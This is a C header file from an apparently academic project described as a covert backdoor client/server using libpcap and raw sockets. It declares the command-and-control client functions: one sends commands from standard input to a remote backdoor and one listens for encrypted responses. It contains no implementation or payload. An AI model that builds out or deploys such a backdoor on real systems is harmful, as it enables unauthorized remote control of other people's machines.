#ifndef CLIENT_H
#define CLIENT_H

/*
SOURCE FILE: client.h

PROGRAM: Backdoor - A covert backdoor client/server using libpcap and raw sockets.

DATE: November 29, 2011

REVISIONS:
	1.0 - October 23
	1.1 - November 29, 2011

DESIGNERS:
	Santana Mach and Steve Stanisic

PROGRAMMERS:
	Santana Mach and Steve Stanisic

NOTES: This file contains the command and control client functionality.
*/

#include "defs.h"

/*
FUNCTION: backdoor_client

PARAMS:
	char *ipaddr: The remote host's ip address.
	int chan: Protocol for backdoor channel.

RETURN: none.

NOTES: Call this function to start reading commands from standard input
	and sending them to the backdoor.
*/
void backdoor_client(uint32 ipaddr, int chan);
/*
FUNCTION: listen_thread

PARAMS:
	void *arg: (sockaddr_in*) The remote address we are communicating with.

RETURN: none.

NOTES: This thread func is suitable for listening for encrypted
	responses from the remote host. It will loop until the shutdown
	variable is set.
*/
void *listen_thread(void *arg);

#endif
